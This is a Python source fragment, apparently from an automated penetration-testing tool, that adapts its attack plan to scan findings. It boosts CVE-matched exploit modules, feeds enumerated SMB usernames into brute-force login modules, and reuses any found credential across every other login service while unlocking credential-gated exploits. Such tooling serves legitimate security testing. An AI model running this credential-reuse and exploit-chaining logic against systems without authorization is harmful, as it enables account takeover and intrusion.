                    continue
                self.profile.add_credential(f.category, f.port, user, pw)
                new.extend(self._on_credential(f.category, user, pw))

            elif f.key == "product":
                svc = Service(port=f.port, protocol="tcp", state="open",
                              name=f.category, product=str(f.value))
                before = len(self.plan)
                self._kb_vectors(f.category, svc)
                self._add_version_exploits(f.category, svc)
                if len(self.plan) > before:
                    new.extend(self.plan.all()[before:])
                if f.detail:
                    self.profile.notes.append(f.detail)

            elif f.key == "cve":
                # NSE confirmed a CVE: inject (or boost) its exact exploit.
                cve = str(f.value).upper()
                self.profile.add_fact("cve", [cve])
                spec = _CVE_EXPLOITS.get(cve)
                if spec:
                    module = spec["module"]
                    port = f.port or spec.get("default_port", 0)
                    if not self.plan.boost(module, 200, f"NSE: {cve} ZAFIYETLI"):
                        opts = {"RHOSTS": self.profile.target}
                        if port:
                            opts["RPORT"] = port
                        v = AttackVector(
                            phase="exploit", kind="exploit", module=module,
                            module_type="exploit",
                            category=spec.get("category", f.category),
                            service_port=port, service_name=f.category,
                            rationale=f"NSE {cve} zafiyetli -> {spec.get('note', module)}",
                            source="adaptive", score=360, options=opts,
                        )
                        if self.plan.add(v):
                            new.append(v)
                if f.detail:
                    self.profile.notes.append(f.detail)

            elif f.key == "smb.users":
                # Enumerated usernames (netexec/NSE): remember them and feed
                # them into every login module so brute/credential tries them.
                users = [u for u in (f.value or []) if u]
                self.profile.add_fact("smb.users", users)
                for cat, module in _LOGIN_MODULES.items():
                    for svc in self.profile.categorized.get(cat, []):
                        v = self.plan.find(module, svc.port)
                        if not v:
                            continue
                        bucket = v.options.setdefault("_users", [])
                        for u in users:
                            if u not in bucket:
                                bucket.append(u)
                if f.detail:
                    self.profile.notes.append(f.detail)

            else:
                # Generic capture: web-enum / nuclei / nikto / exposed-path and
                # any other fact-style finding. Record it so the report and later
                # decisions can use it, without needing a dedicated branch.
                self.profile.add_fact(f.key, f.value)
                if f.detail:
                    self.profile.notes.append(f.detail)

        if new:
            logger.info("Adaptif: %d yeni/guclendirilmis vektor.", len(new))
        return new

    def _on_credential(self, category: str, user: str, pw: str) -> list[AttackVector]:
        """A valid credential was found: reuse it and unlock cred-gated exploits."""
        new: list[AttackVector] = []

        # 1) Credential reuse: push this exact pair into every other login
        #    service, so one leaked account is tried everywhere.
        for cat, module in _LOGIN_MODULES.items():
            for svc in self.profile.categorized.get(cat, []):
                existing = self.plan.find(module, svc.port)
                if existing:
                    existing.options.setdefault("_users", []).insert(0, user)
                    existing.options.setdefault("_passwords", []).insert(0, pw)
                    existing.score += 40
                    note = f"credential reuse ({user})"
                    existing.rationale += f" | {note}"
                elif cat != category:
                    v = self._login_vector(cat, svc, module)
                    if v:
                        v.options["_users"].insert(0, user)
                        v.options["_passwords"].insert(0, pw)
                        v.score += 40
                        v.source = "adaptive"
                        v.rationale = f"credential reuse: {user} -> {cat}"
                        if self.plan.add(v):
                            new.append(v)

        # 2) Unlock credential-gated knowledge-base exploits now that we have creds.
        for cat in self.profile.categorized:
            for svc in self.profile.categorized[cat]:
                before = len(self.plan)
                self._kb_vectors(cat, svc, creds_known=True)
                if len(self.plan) > before:
                    new.extend(self.plan.all()[before:])
        return new
